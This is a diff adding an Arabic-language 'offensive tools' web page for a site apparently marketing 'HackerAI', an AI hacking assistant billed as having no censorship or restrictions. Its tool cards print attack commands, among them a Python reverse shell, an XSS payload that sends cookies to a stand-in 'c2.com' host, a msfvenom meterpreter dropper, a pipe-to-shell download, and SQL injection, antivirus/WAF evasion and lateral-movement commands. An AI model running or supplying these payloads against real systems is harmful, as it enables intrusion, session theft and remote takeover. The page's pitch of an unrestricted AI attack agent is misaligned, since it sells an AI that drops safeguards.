@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackerAI - الأدوات الهجومية</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+    <div class="matrix-bg"></div>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="index.html" class="logo">
+                    <span class="logo-icon">🐉</span>
+                    <span class="logo-text">Hacker<span class="accent">AI</span></span>
+                </a>
+                <div class="nav-links">
+                    <a href="index.html">الرئيسية</a>
+                    <a href="chat.html">المحادثة المباشرة</a>
+                    <a href="tools.html" class="active">الأدوات الهجومية</a>
+                    <a href="results.html">نتائج الاختراق</a>
+                </div>
+                <button class="menu-toggle"><i class="fas fa-bars"></i></button>
+            </div>
+        </div>
+    </nav>
+
+    <section class="tools-page">
+        <div class="container">
+            <div class="section-header">
+                <h2>ترسانة <span class="gradient-text">الأدوات الهجومية</span></h2>
+                <p>جميع الأدوات جاهزة للاستخدام المباشر - بدون رقابة ولا قيود</p>
+            </div>
+
+            <div class="tools-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <span></span><span></span><span></span>
+                    </div>
+                    <span>hackerai@agent:~$</span>
+                </div>
+                <div class="terminal-body" id="toolsTerminal">
+                    <div class="terminal-line">
+                        <span class="prompt">root@hackerai:~#</span> 
+                        <span class="cmd">./tools --list --all</span>
+                    </div>
+                    <div class="terminal-output">
+                        <p>[+] تحميل الترسانة الهجومية...</p>
+                        <p>[+] 53 أداة جاهزة للاستخدام</p>
+                        <p>[+] نظام التخفي: نشط</p>
+                        <p>[+] تجاوز WAF: مفعل</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tools-filter">
+                <div class="search-box">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="toolSearch" placeholder="ابحث عن أداة هجومية...">
+                </div>
+                <div class="filter-tabs">
+                    <button class="filter-btn active" data-filter="all">جميع الأدوات</button>
+                    <button class="filter-btn" data-filter="exploit">Exploits</button>
+                    <button class="filter-btn" data-filter="recon">استطلاع</button>
+                    <button class="filter-btn" data-filter="payload">بايولودز</button>
+                    <button class="filter-btn" data-filter="scan">فحص</button>
+                    <button class="filter-btn" data-filter="bypass">تجاوز</button>
+                    <button class="filter-btn" data-filter="post">ما بعد الاستغلال</button>
+                </div>
+            </div>
+
+            <div class="tools-grid" id="toolsGrid">
+                <!-- 1 -->
+                <div class="tool-card" data-category="exploit">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-database"></i></div>
+                        <span class="tool-badge exploit">SQL Injection</span>
+                    </div>
+                    <h3>SQLi Exploit Engine</h3>
+                    <p>محرك استغلال SQLi متقدم - يدعم Blind, Time-based, Error-based, Union</p>
+                    <pre><code>sqlmap -u "http://target.com/page?id=1" --dbs --batch</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 2 -->
+                <div class="tool-card" data-category="recon">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-map"></i></div>
+                        <span class="tool-badge recon">Nmap Pro</span>
+                    </div>
+                    <h3>ماسح الشبكات المتقدم</h3>
+                    <p>مسح شامل للشبكات مع كشف الخدمات، نظام التشغيل، والثغرات</p>
+                    <pre><code>nmap -sC -sV -O -A -T4 target.com</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 3 -->
+                <div class="tool-card" data-category="payload">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-skull"></i></div>
+                        <span class="tool-badge payload">Reverse Shell</span>
+                    </div>
+                    <h3>مولد Reverse Shell</h3>
+                    <p>يولد Reverse Shells بجميع اللغات: Python, PHP, Bash, PowerShell, Netcat, MSFVenom</p>
+                    <pre><code>python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 4 -->
+                <div class="tool-card" data-category="scan">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-bug"></i></div>
+                        <span class="tool-badge scan">Nuclei</span>
+                    </div>
+                    <h3>ماسح الثغرات الآلي</h3>
+                    <p>مسح آلاف الثغرات في ثوانٍ باستخدام قوالب YAML</p>
+                    <pre><code>nuclei -u https://target.com -t cves/ -severity critical,high</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 5 -->
+                <div class="tool-card" data-category="bypass">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-shield-halved"></i></div>
+                        <span class="tool-badge bypass">Bypass Engine</span>
+                    </div>
+                    <h3>محرك تجاوز الحماية</h3>
+                    <p>تجاوز WAF, AV, EDR, AMSI مع تشفير وتعتيم البايولودز</p>
+                    <pre><code>python3 bypass.py --target target.com --technique xor+base64</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 6 -->
+                <div class="tool-card" data-category="post">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-arrow-up-from-bracket"></i></div>
+                        <span class="tool-badge post">PrivEsc</span>
+                    </div>
+                    <h3>رفع الصلاحيات</h3>
+                    <p>أدوات رفع صلاحيات لأنظمة Linux و Windows مع سكريبتات جاهزة</p>
+                    <pre><code>wget https://raw.githubusercontent.com/peass/linpeas.sh | sh</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 7 -->
+                <div class="tool-card" data-category="recon">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-globe"></i></div>
+                        <span class="tool-badge recon">Subdomain Finder</span>
+                    </div>
+                    <h3>مكتشف الساب دومين</h3>
+                    <p>يكشف جميع النطاقات الفرعية باستخدام 3 مصادر مختلفة</p>
+                    <pre><code>subfinder -d target.com | httpx -silent | nuclei -t cves/</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 8 -->
+                <div class="tool-card" data-category="exploit">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-code"></i></div>
+                        <span class="tool-badge exploit">XSS Framework</span>
+                    </div>
+                    <h3>إطار XSS متكامل</h3>
+                    <p>مكتبة ضخمة من Payloads XSS مع كشف واستغلال تلقائي</p>
+                    <pre><code>&lt;script&gt;fetch('https://c2.com/steal?c='+document.cookie)&lt;/script&gt;</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 9 -->
+                <div class="tool-card" data-category="payload">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-syringe"></i></div>
+                        <span class="tool-badge payload">Dropper Generator</span>
+                    </div>
+                    <h3>مولد Dropper</h3>
+                    <p>يولد Droppers متخفية لاختراق الأنظمة المستهدفة</p>
+                    <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 10 -->
+                <div class="tool-card" data-category="scan">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-wordpress"></i></div>
+                        <span class="tool-badge scan">WPScan</span>
+                    </div>
+                    <h3>WPScan - فحص ووردبريس</h3>
+                    <p>فحص مواقع ووردبريس لاكتشاف الثغرات والإضافات الضعيفة</p>
+                    <pre><code>wpscan --url https://target.com --enumerate vp</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 11 -->
+                <div class="tool-card" data-category="bypass">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-mask"></i></div>
+                        <span class="tool-badge bypass">AV Evasion Kit</span>
+                    </div>
+                    <h3>طقم تجاوز مضاد الفيروسات</h3>
+                    <p>تقنيات متقدمة لتشفير وإخفاء البايولودز من جميع مضادات الفيروسات</p>
+                    <pre><code>python3 shellcode_encoder.py --input payload.bin --output encoded.bin</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+                <!-- 12 -->
+                <div class="tool-card" data-category="post">
+                    <div class="tool-card-header">
+                        <div class="tool-icon"><i class="fas fa-binoculars"></i></div>
+                        <span class="tool-badge post">Lateral Movement</span>
+                    </div>
+                    <h3>الحركة الجانبية</h3>
+                    <p>أدوات التنقل بين الأنظمة المخترقة وسرقة البيانات</p>
+                    <pre><code>proxychains crackmapexec smb 192.168.1.0/24 -u user -p pass</code></pre>
+                    <div class="tool-card-footer">
+                        <a href="chat.html" class="btn btn-primary btn-sm"><i class="fas fa-bolt"></i> استخدم الأداة</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="logo-icon">🐉</span>
+                    <span class="logo-text">Hacker<span class="accent">AI</span></span>
+                </div>
+                <div class="footer-bottom">
+                    <p>HackerAI &copy; 2026 | جميع الأدوات للأغراض التعليمية واختبار الاختراق المأذون به</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="assets/js/main.js"></script>
+    <script src="assets/js/tools.js"></script>
+</body>
+</html>
